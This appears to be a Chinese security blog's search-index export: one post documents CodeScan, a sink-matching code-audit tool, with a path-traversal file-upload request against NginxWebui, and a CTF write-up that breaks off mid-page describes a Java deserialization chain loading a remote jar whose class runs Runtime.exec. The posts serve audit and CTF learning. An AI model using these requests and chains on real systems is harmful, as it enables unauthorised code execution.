<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>开发 - CodeScan</title>
    <link href="/post/develop-codescan-zwcz53.html"/>
    <url>/post/develop-codescan-zwcz53.html</url>
    
    <content type="html"><![CDATA[<h1 id="开发-CodeScan"><a href="#开发-CodeScan" class="headerlink" title="开发 - CodeScan"></a>开发 - CodeScan</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这里是详细解释下CodeScan的用法，之前偏向于快速的代码审计，于是就写了一个这种快速匹配Sink点的工具，省的每次点点点搜搜索了，Python属实不优雅，就拿go写了一下，难度不大，练练手的项目，审计也不能一成不变的死磕，利用一些辅助工具会事半功倍，以下为完全详解，有任何问题和Bug可以Github上提Issue或者在Blog的关于页面找我的联系方式进行私聊，对师傅们有帮助的话可以点点Stars捏。</p><p>‍</p><h1 id="CodeScan"><a href="#CodeScan" class="headerlink" title="CodeScan"></a>CodeScan</h1><h2 id="工具概述"><a href="#工具概述" class="headerlink" title="工具概述"></a>工具概述</h2><p>该工具目的为对大多数不完整的代码以及依赖快速进行Sink点匹配来帮助红队完成快速代码审计，开发该工具的初衷是以<code>Sink</code>​到<code>Source</code>​的思路来开发，为了将所有可疑的Sink点匹配出来并且凭借第六感进行快速漏洞挖掘，并且该工具开发可扩展性强，成本极低，目前工具支持的语言有PHP，Java(JSP)</p><p>‍</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">./build.sh<br><br><span class="hljs-comment"># 会生成所有版本在releases下</span><br></code></pre></td></tr></table></figure><p>‍</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ol><li><p>框架识别</p></li><li><p>涵盖大部分漏洞的Sink点的匹配(如图)</p><p> <img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240928235812-5wlbnbb.png" alt="image">​</p></li><li><p>可自定义定制化修改黑白名单内容</p></li><li><p>多模块化多语言化代码审计</p></li><li><p>进行融于鉴权代码的快速匹配抓取</p></li><li><p>根据Jar进行静态分析(默认分析)</p></li></ol><ul><li>mysqlconnect–&gt;jdbc</li><li>Xstream –&gt; xml&#x2F;json</li></ul><p>‍</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>‍</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">Usage of ./CodeScan_darwin_arm64:<br>  -L string<br>        审计语言<br>  -d string<br>        要扫描的目录<br>  -h string<br>        使用帮助<br>  -lb string<br>        行黑名单<br>  -m string<br>        过滤的字符串<br>  -pb string<br>        路径黑名单<br>  -r string<br>        RCE规则<br>  -u string<br>        文件上传规则<br><br><br>Example:<br>CodeScan_windows_amd64.exe -L java -d ./net<br>CodeScan_windows_amd64.exe -L php -d ./net<br>CodeScan_windows_amd64.exe -d ./net -m <span class="hljs-string">&quot;CheckSession.jsp&quot;</span><br></code></pre></td></tr></table></figure><p>‍</p><h2 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h2><p><code>以下均以Java作为示例</code>​</p><h3 id="高扩展性"><a href="#高扩展性" class="headerlink" title="高扩展性"></a>高扩展性</h3><p>很简单的自定义，如果需要自定义一些匹配规则，首先可以在这里加入</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240929002903-ypqa197.png" alt="image">​</p><p>‍</p><p>其次如果需要新增漏洞类型，只需要三步(这里以Sql为例)</p><ol><li>新建SQL目录</li><li>定义一个方法叫 SqlCheck</li><li>写一个sqlcheck.txt(生成的文件名) + 你自定义的规则</li><li>最后在这里加入包名+方法名即可</li></ol><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240929003143-7v37o9w.png" alt="image">​</p><p>‍</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> SqlTest<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;CodeScan/FindFile&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SqlCheck</span><span class="hljs-params">(dir <span class="hljs-type">string</span>)</span></span> &#123;<br>FindFile.FindFileByJava(dir, <span class="hljs-string">&quot;fastjson.txt&quot;</span>, []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;.parseObject(&quot;</span>&#125;)<br>fmt.Println(<span class="hljs-string">&quot;SqlCheck分析完成&quot;</span>)<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>‍</p><h3 id="扫描位置"><a href="#扫描位置" class="headerlink" title="扫描位置"></a>扫描位置</h3><p>在打一些闭源代码的时候经常就一个Jar或者Class，反编译的时候会把依赖进行一起反编译，所以为了避免扫描一些依赖的误报，在工具中自带的黑名单中会过滤掉如下黑名单的包名，需要自定义的时候可自行修改，位置在<code>CommonVul/Rule/MatchPathRule.go</code>​</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> PathBlackJava = []<span class="hljs-type">string</span>&#123;<br><span class="hljs-string">&quot;apache&quot;</span>, <span class="hljs-string">&quot;lombok&quot;</span>, <span class="hljs-string">&quot;microsoft&quot;</span>, <span class="hljs-string">&quot;solr&quot;</span>,<br><span class="hljs-string">&quot;amazonaws&quot;</span>, <span class="hljs-string">&quot;c3p0&quot;</span>, <span class="hljs-string">&quot;jodd&quot;</span>, <span class="hljs-string">&quot;afterturn&quot;</span>, <span class="hljs-string">&quot;hutool&quot;</span>,<br><span class="hljs-string">&quot;javassist&quot;</span>, <span class="hljs-string">&quot;alibaba&quot;</span>, <span class="hljs-string">&quot;aliyuncs&quot;</span>, <span class="hljs-string">&quot;javax&quot;</span>, <span class="hljs-string">&quot;jackson&quot;</span>,<br><span class="hljs-string">&quot;bytebuddy&quot;</span>, <span class="hljs-string">&quot;baomidou&quot;</span>, <span class="hljs-string">&quot;google&quot;</span>, <span class="hljs-string">&quot;netty&quot;</span>, <span class="hljs-string">&quot;redis&quot;</span>, <span class="hljs-string">&quot;mysql&quot;</span>,<br><span class="hljs-string">&quot;logback&quot;</span>, <span class="hljs-string">&quot;ognl&quot;</span>, <span class="hljs-string">&quot;oracle&quot;</span>, <span class="hljs-string">&quot;sun&quot;</span>, <span class="hljs-string">&quot;junit&quot;</span>, <span class="hljs-string">&quot;reactor&quot;</span>, <span class="hljs-string">&quot;github&quot;</span>,<br><span class="hljs-string">&quot;mchange&quot;</span>, <span class="hljs-string">&quot;taobao&quot;</span>, <span class="hljs-string">&quot;nimbusds&quot;</span>, <span class="hljs-string">&quot;opensymphony&quot;</span>, <span class="hljs-string">&quot;freemarker&quot;</span>, <span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-string">&quot;apiguardian&quot;</span>, <span class="hljs-string">&quot;hibernate&quot;</span>, <span class="hljs-string">&quot;javassist&quot;</span>, <span class="hljs-string">&quot;jboss&quot;</span>, <span class="hljs-string">&quot;junit&quot;</span>, <span class="hljs-string">&quot;mybatis&quot;</span>,<br><span class="hljs-string">&quot;springframework&quot;</span>, <span class="hljs-string">&quot;slf4j&quot;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>所以这也导致了一个问题，不能从顶层上直接扫描</p><blockquote><p>常见目录为</p><p>└─main<br>    ├─java<br>    │  └─net<br>    │      └─mingsoft<br>    │          ├─cms<br>    │          │  ├─action<br>    │          │  │  └─web<br>    │          │  ├─aop<br>    │          │  ├─bean<br>    │          │  ├─biz<br>    │          │  │  └─impl<br>    │          │  ├─constant<br>    │          │  │  └─e<br>    │          │  ├─dao<br>    │          │  ├─entity<br>    │          │  ├─resources<br>    │          │  └─util<br>    │          └─config</p></blockquote><p><code>请把CodeScan放在Net同级目录下扫描(否则会忽略掉直接一个Java目录)</code>​</p><p>请<code>-d</code>​后面的参数尽量在<code>/src/main/java</code>​之后，比如这里就需要把CodeScan放到<code>net</code>​目录下开始扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CodeScan_windows_amd64.exe -L java -d ./net<br></code></pre></td></tr></table></figure><h3 id="过滤字符串-只写了JSP-PHP"><a href="#过滤字符串-只写了JSP-PHP" class="headerlink" title="过滤字符串(只写了JSP + PHP)"></a>过滤字符串(只写了JSP + PHP)</h3><p>比如现在有一个代码百分百为鉴权代码在JSP中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ include file=<span class="hljs-string">&quot;../../common/js/CheckSession.jsp&quot;</span>%&gt;<br></code></pre></td></tr></table></figure><p>此时可以用一下功能来进行快速获取未鉴权代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CodeScan_windows_amd64.exe -d ./yuan -m <span class="hljs-string">&quot;CheckSession.jsp&quot;</span><br></code></pre></td></tr></table></figure><p>此时会将不存在这个代码的文件都放到<code>NoAuthDir</code>​目录中，然后可以再扫一遍就可以立刻定位到存在未鉴权并且存在Sink点的函数文件了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CodeScan_windows_amd64.exe -L java -d ./NoAuthDir<br></code></pre></td></tr></table></figure><p>‍</p><h3 id="静态分析依赖情况"><a href="#静态分析依赖情况" class="headerlink" title="静态分析依赖情况"></a>静态分析依赖情况</h3><p>只需要在CodeScan的目录下放入EvilJarList.txt即可匹配出来</p><p><code>EvilJarList.txt</code>​ 内容为存在可打漏洞的<code>Jar</code>​,模版如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">fastjson-1.2.47.jar<br>resin-4.0.63.jar<br>jackson-core-2.13.3.jar<br>c3p0-0.9.5.2.jar<br>commons-beanutils-1.9.4.jar<br>commons-beanutils-1.9.3.jar<br>commons-beanutils-1.9.2.jar<br>commons-collections-3.2.1.jar<br>mysql-connector-java-8.0.17.jar<br>commons-collections4-4.0.jar<br>shiro-core-1.10.1.jar<br>aspectjweaver-1.9.5.jar<br>rome-1.0.jar<br>xstream-1.4.11.1.jar<br>sqlite-jdbc-3.8.9.jar<br>vaadin-server-7.7.14.jar<br>hessian-4.0.63.jar<br></code></pre></td></tr></table></figure><p>‍</p><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li>将结果从TXT转为Excel</li><li>Sink点继续完善</li><li>ASP</li></ul><h2 id="支持项目"><a href="#支持项目" class="headerlink" title="支持项目"></a>支持项目</h2><ul><li>如果有师傅发现Bug或者有更好的建议请提issue感谢</li><li>要是各位师傅通过本人的小工具挖到一些好洞记得回头点点Stars诶</li></ul><p>‍</p><p>‍</p><h2 id="详细使用文章-内附案例"><a href="#详细使用文章-内附案例" class="headerlink" title="详细使用文章(内附案例)"></a>详细使用文章(内附案例)</h2><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>这里就展示下一些简单的代码，只有自己用了才知道真香</p><h4 id="NginxWebui"><a href="#NginxWebui" class="headerlink" title="NginxWebui"></a>NginxWebui</h4><p>先框架分析为Spring</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240406155237-imb68qu.png" alt="image">​</p><p>‍</p><h5 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h5><p>工具扫描出结果为</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240406155756-ob60ahp.png" alt="image">​</p><p>有时候代码就是可以直接秒的，这里发现<code>transferTo</code>​ 这个sink点就在控制层</p><p>‍</p><p>找到<code>src/main/java/com/cym/controller/adminPage/MainController.java</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240406155950-rnf1w3w.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240406160610-h206usc.png" alt="image">​</p><p>这种名字可以进行跨目录上传</p><p>直接传即可上传成功</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240406160326-n6xok99.png" alt="image">​</p><p>报文</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">POST</span> <span class="hljs-string">/admiNPage/main/upload</span> <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-attr">Host:</span> <span class="hljs-string">localhost:8080</span><br><span class="hljs-attr">Accept:</span> <span class="hljs-string">application/json,</span> <span class="hljs-string">text/javascript,</span> <span class="hljs-string">*/*;</span> <span class="hljs-string">q=0.01</span><br><span class="hljs-attr">Accept-Encoding:</span> <span class="hljs-string">gzip,</span> <span class="hljs-string">deflate,</span> <span class="hljs-string">br,</span> <span class="hljs-string">zstd</span><br><span class="hljs-attr">Accept-Language:</span> <span class="hljs-string">zh-CN,zh;q=0.9</span><br><span class="hljs-attr">Content-Length:</span> <span class="hljs-number">0</span><br><span class="hljs-attr">Origin:</span> <span class="hljs-string">http://localhost:8080</span><br><span class="hljs-attr">Referer:</span> <span class="hljs-string">http://localhost:8080/adminPage/monitor</span><br><span class="hljs-attr">Sec-Fetch-Dest:</span> <span class="hljs-string">empty</span><br><span class="hljs-attr">Sec-Fetch-Mode:</span> <span class="hljs-string">cors</span><br><span class="hljs-attr">Sec-Fetch-Site:</span> <span class="hljs-string">same-origin</span><br><span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">NT</span> <span class="hljs-number">10.0</span><span class="hljs-string">;</span> <span class="hljs-string">Win64;</span> <span class="hljs-string">x64)</span> <span class="hljs-string">AppleWebKit/537.36</span> <span class="hljs-string">(KHTML,</span> <span class="hljs-string">like</span> <span class="hljs-string">Gecko)</span> <span class="hljs-string">Chrome/123.0.0.0</span> <span class="hljs-string">Safari/537.36</span><br><span class="hljs-attr">X-Requested-With:</span> <span class="hljs-string">XMLHttpRequest</span><br><span class="hljs-attr">sec-ch-ua:</span> <span class="hljs-string">&quot;Google Chrome&quot;</span><span class="hljs-string">;v=&quot;123&quot;,</span> <span class="hljs-string">&quot;Not:A-Brand&quot;</span><span class="hljs-string">;v=&quot;8&quot;,</span> <span class="hljs-string">&quot;Chromium&quot;</span><span class="hljs-string">;v=&quot;123&quot;</span><br><span class="hljs-attr">sec-ch-ua-mobile:</span> <span class="hljs-string">?0</span><br><span class="hljs-attr">sec-ch-ua-platform:</span> <span class="hljs-string">&quot;Windows&quot;</span><br><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">multipart/form-data;</span> <span class="hljs-string">boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A</span><br> <br><span class="hljs-string">------WebKitFormBoundarye8FPHsIAq9JN8j2A</span><br><span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;file&quot;;filename=&quot;../3.jsp&quot;</span><br><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">image/jpeg</span><br> <br>&lt;%<span class="language-ruby">out.print(<span class="hljs-string">&quot;test&quot;</span>);</span>%&gt;<br><span class="hljs-string">------WebKitFormBoundarye8FPHsIAq9JN8j2A--</span><br><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240406160725-a19hq1m.png" alt="image">​</p><p>‍</p><h5 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h5><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240406161504-eys6pkt.png" alt="image">​</p><p>直接去找了下控制层的代码</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240406161613-ujiovc5.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240406161722-27awoxu.png" alt="image">​</p><p>emmm这代码可真弱智，再去调用控制层的代码。。。</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240406161933-tsbc5fw.png" alt="image">​</p><p>‍</p><p>由于一些闭源代码不适合放，因此就拿个开源的nday来进行分析吧，其实原理懂了之后只是合适辅助罢了，但我看开源上都没有人写过，也是就造下轮子开源出来了</p><p>‍</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF - 羊城Web题解(近况)</title>
    <link href="/post/java-security-yangcheng-web-title-readns-1mzaln.html"/>
    <url>/post/java-security-yangcheng-web-title-readns-1mzaln.html</url>
    
    <content type="html"><![CDATA[<h1 id="CTF-羊城Web题解-近况"><a href="#CTF-羊城Web题解-近况" class="headerlink" title="CTF - 羊城Web题解(近况)"></a>CTF - 羊城Web题解(近况)</h1><p>‍</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很久没更新博客了，偶尔写一篇，记录一下打了一天的题(太久没打了太菜了我的哥，其实也不是太久没打的问题，一直都这样)，最近护网，巨忙，很难想象一个安服仔一天工作16h的样子，害，安服仔的命，最近也是忙了点扫描器开发，然后就是背书等着考试了，考啥–GA考试+秋招，虽然目前已经有几家聊得还不错愿意要我(收留我)，但还在等其他家给个面试机会(很疑惑某手，我咋刚投就被拒了呢？是我简历有病毒吗还是啥)，开发的东西暂不开源，打算靠他来打打护网审计审计，讲讲最近打的神仙比赛吧 — 羊城杯 (准备成都打巅峰极客) –&gt; 抢一把我大头Die的生意</p><p>‍</p><p>‍</p><h2 id="羊城杯"><a href="#羊城杯" class="headerlink" title="羊城杯"></a>羊城杯</h2><p>我好像打了？又好像没打？我看最高分1个达不溜，我擦？一个比赛干一个达不溜，你整个学校来打了吧(太强太夸张了)</p><p>‍</p><p>‍</p><h3 id="Ez-java"><a href="#Ez-java" class="headerlink" title="Ez_java"></a>Ez_java</h3><p>有权限校验，但是是1.2.4的shiro，可以绕过本来以为可以直接打反序列化的，但是发现这里是可以自己实现登录逻辑的，自定义实现了Realm，不懂看这</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">https:<span class="hljs-comment">//blog.csdn.net/qq_42814833/article/details/118897560</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240827133953-ajlzh0u.png" alt="image">​</p><p>‍</p><p>看依赖有几个有问题的依赖包，看代码注意下ycb的包名即可，查看User这个Java Bean</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240827134336-kle1w6h.png" alt="image">​</p><p>发现个getter能调用URLclassloader加载类，但是ban了 <code>http</code>​和 <code>file</code>​ 之前做过，想到用<code>jar</code>​协议来绕开并且远程加载jar包即可</p><p>接下来看控制器发现可以裸反序列化，但是存在黑名单</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240827134411-cnjipvv.png" alt="image">​</p><p>‍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] blacklist = &#123;<br><span class="hljs-string">&quot;java.lang.Runtime&quot;</span>, <br><span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>, <br><span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>, <br><span class="hljs-string">&quot;java.security.SignedObject&quot;</span>, <br><span class="hljs-string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>, <br><span class="hljs-string">&quot;org.apache.commons.beanutils&quot;</span>, <br><span class="hljs-string">&quot;org.apache.commons.collections&quot;</span>, <br><span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>, <span class="hljs-string">&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>禁用了BadAttributeValueExpException，但是可以走Hashtable的tostring去调用Jackson来完成getter的触发(恰好是之前审的帆软，也是CT大哥的文章)，可以想到直接调用到上述的getgift，tututu就写好了</p><p>此时去生成一个恶意的jar即可，但这里要注意下URLclassloader是会把Jar加载的JVM里头，但你不去调用他就不会去找这个类，所以我们要去找这个类才能触发HTTP请求 or file协议</p><p>这里给出自己调试的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">gift</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;jar:http://127.0.0.1:8081/hello.jar!/&quot;</span>;<br>    <span class="hljs-type">URL</span> <span class="hljs-variable">url1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(gift);<br>    Class&lt;?&gt; URLclass = Class.forName(<span class="hljs-string">&quot;java.net.URLClassLoader&quot;</span>);<br>    <span class="hljs-type">Method</span> <span class="hljs-variable">add</span> <span class="hljs-operator">=</span> URLclass.getDeclaredMethod(<span class="hljs-string">&quot;addURL&quot;</span>, URL.class);<br>    add.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">classloader</span> <span class="hljs-operator">=</span> (URLClassLoader) ClassLoader.getSystemClassLoader();<br>    add.invoke(classloader, url1);<br></code></pre></td></tr></table></figure><p>‍</p><p>我的jar是这样子的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;open .&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;&#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Main</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;person constructor&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Main</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Person.getName()&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Person.setName()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Person.getAge()&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Person.setAge()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">Main</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Main</span>();<br>        serialize(person);<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br><br>    &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br><br><br><br></code></pre></td></tr></table></figure><p>此时直接加载是不会触发HTTP请求的，也不会实例化该类，此时用反射去调用该类即可触发HTTP请求了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240828104921-p3qhauy.png" 